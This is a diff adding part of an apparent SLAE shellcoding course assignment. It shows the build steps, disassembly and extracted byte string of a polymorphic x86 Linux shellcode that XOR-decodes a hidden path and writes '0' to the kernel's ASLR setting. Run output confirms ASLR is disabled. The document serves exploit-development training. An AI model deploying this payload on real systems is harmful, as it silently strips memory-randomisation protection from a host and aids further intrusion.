@@ -55,3 +55,86 @@ Len: 36
 
 Step 3:
 
+Prepare the polymorphic Shellcodes(modified) as per SLAE Assignment # 6, here our file name is Assignment6-1.nasm
+
+root@kali:/home/SLAE/MY_EXP/Assignment6# nasm -f elf Assignment6-1.nasm                                                                                                 
+root@kali:/home/SLAE/MY_EXP/Assignment6# ld -o Assignment6-1 Assignment6-1.o
+root@kali:/home/SLAE/MY_EXP/Assignment6# objdump -D Assignment6-1 -M intel
+Assignment6-1:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       31 c0                   xor    eax,eax
+ 8048062:       04 25                   add    al,0x25
+ 8048064:       68 ad bc be b8          push   0xb8bebcad
+ 8048069:       68 ab bc 82 ae          push   0xae82bcab
+ 804806e:       68 b4 a7 b8 82          push   0x82b8a7b4
+ 8048073:       68 b3 b9 b2 b0          push   0xb0b2b9b3
+ 8048078:       68 b1 f2 af bc          push   0xbcaff2b1
+ 804807d:       68 b8 af b3 b8          push   0xb8b3afb8
+ 8048082:       68 a4 ae f2 b6          push   0xb6f2aea4
+ 8048087:       68 b2 be f2 ae          push   0xaef2beb2
+ 804808c:       68 f2 f2 ad af          push   0xafadf2f2
+
+08048091 <decode>:
+ 8048091:       fe c8                   dec    al
+ 8048093:       8a 0c 04                mov    cl,BYTE PTR [esp+eax*1]
+ 8048096:       80 f1 dd                xor    cl,0xdd
+ 8048099:       88 0c 04                mov    BYTE PTR [esp+eax*1],cl
+ 804809c:       38 e0                   cmp    al,ah
+ 804809e:       75 f1                   jne    8048091 <decode>
+ 80480a0:       89 44 24 24             mov    DWORD PTR [esp+0x24],eax
+ 80480a4:       89 e3                   mov    ebx,esp
+ 80480a6:       66 b9 11 01             mov    cx,0x111
+ 80480aa:       66 81 c1 ab 01          add    cx,0x1ab
+ 80480af:       b0 08                   mov    al,0x8
+ 80480b1:       cd 80                   int    0x80
+ 80480b3:       89 c3                   mov    ebx,eax
+ 80480b5:       50                      push   eax
+ 80480b6:       66 ba 85 8f             mov    dx,0x8f85
+ 80480ba:       66 81 ea 55 55          sub    dx,0x5555
+ 80480bf:       66 52                   push   dx
+ 80480c1:       89 e1                   mov    ecx,esp
+ 80480c3:       31 d2                   xor    edx,edx
+ 80480c5:       42                      inc    edx
+ 80480c6:       b0 05                   mov    al,0x5
+ 80480c8:       fe c8                   dec    al
+ 80480ca:       cd 80                   int    0x80
+ 80480cc:       b0 05                   mov    al,0x5
+ 80480ce:       fe c0                   inc    al
+ 80480d0:       cd 80                   int    0x80
+ 80480d2:       40                      inc    eax
+ 80480d3:       cd 80                   int    0x80
+ 
+ Step 4 :
+ Check the running x86 linux system has enable the ASLR 
+ root@kali:/home/SLAE/MY_EXP/Assignment6# cat /proc/sys/kernel/randomize_va_space
+2  --> 2 means enable 
+
+Step 5: 
+Obtain the polymorphic Shellcodes(modified) for this Assignment6-1.nasm  
+
+root@kali:/home/SLAE/MY_EXP/Assignment6# objdump -d ./Assignment6-1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x04\x25\x68\xad\xbc\xbe\xb8\x68\xab\xbc\x82\xae\x68\xb4\xa7\xb8\x82\x68\xb3\xb9\xb2\xb0\x68\xb1\xf2\xaf\xbc\x68\xb8\xaf\xb3\xb8\x68\xa4\xae\xf2\xb6\x68\xb2\xbe\xf2\xae\x68\xf2\xf2\xad\xaf\xfe\xc8\x8a\x0c\x04\x80\xf1\xdd\x88\x0c\x04\x38\xe0\x75\xf1\x89\x44\x24\x24\x89\xe3\x66\xb9\x11\x01\x66\x81\xc1\xab\x01\xb0\x08\xcd\x80\x89\xc3\x50\x66\xba\x85\x8f\x66\x81\xea\x55\x55\x66\x52\x89\xe1\x31\xd2\x42\xb0\x05\xfe\xc8\xcd\x80\xb0\x05\xfe\xc0\xcd\x80\x40\xcd\x80"
+root@kali:/home/SLAE/MY_EXP/Assignment6#
+
+
+Compile the shellcode into shellcode1.c and execute into the system.
+
+root@kali:/home/SLAE/MY_EXP/Assignment6# gcc -fno-stack-protector -z execstack shellcode1.c -o Assignment6-1_polyshell
+root@kali:/home/SLAE/MY_EXP/Assignment6# cat /proc/sys/kernel/randomize_va_space
+2 [ ASLR protection enable] 
+
+Execute the Assignment6-1_polyshell  (polymorphic Shellcodes) into the system 
+root@kali:/home/SLAE/MY_EXP/Assignment6# ./Assignment6-1_polyshell
+Shellcode Length:  117
+root@kali:/home/SLAE/MY_EXP/Assignment6#
+root@kali:/home/SLAE/MY_EXP/Assignment6# cat /proc/sys/kernel/randomize_va_space
+0     [ 0 means our shellcode successfully disable the ASLR protection of on this x86 Linux system]
+root@kali:/home/SLAE/MY_EXP/Assignment6#
+
+For enable the ASLR we may execute following command:
+echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+
